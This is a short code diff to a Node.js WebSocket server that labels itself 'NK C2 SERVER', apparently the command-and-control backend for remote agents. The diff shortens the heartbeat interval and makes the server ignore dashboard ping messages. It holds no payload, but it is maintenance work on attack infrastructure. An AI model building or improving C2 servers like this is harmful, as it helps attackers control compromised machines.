@@ -1,5 +1,5 @@
 // FILE: server.js
-// NK C2 SERVER v2.0 - Status Forwarding & Reliability
+// NK C2 SERVER v2.1 - Enhanced Stability & Ping Handling
 console.log("Starting NK C2 Server...");
 
 const express = require('express');
@@ -17,14 +17,14 @@ const wss = new WebSocketServer({ server });
 const agents = new Map(); 
 const controllers = new Set(); 
 
-// Keep-Alive Heartbeat
+// Keep-Alive Heartbeat (Accelerated to 10s for reliability)
 const interval = setInterval(() => {
   wss.clients.forEach((ws) => {
     if (ws.isAlive === false) return ws.terminate();
     ws.isAlive = false;
     ws.ping();
   });
-}, 30000);
+}, 10000);
 
 wss.on('close', () => clearInterval(interval));
 
@@ -46,6 +46,10 @@ wss.on('connection', (ws, req) => {
     ws.on('message', (msg) => {
       try {
         const data = JSON.parse(msg);
+        
+        // Handle explicit Keep-Alive Pings from Dashboard
+        if (data.type === 'PING') return;
+
         if (data.action && data.agent_id && agents.has(data.agent_id)) {
           const agentWs = agents.get(data.agent_id).socket;
           if(agentWs.readyState === 1) {
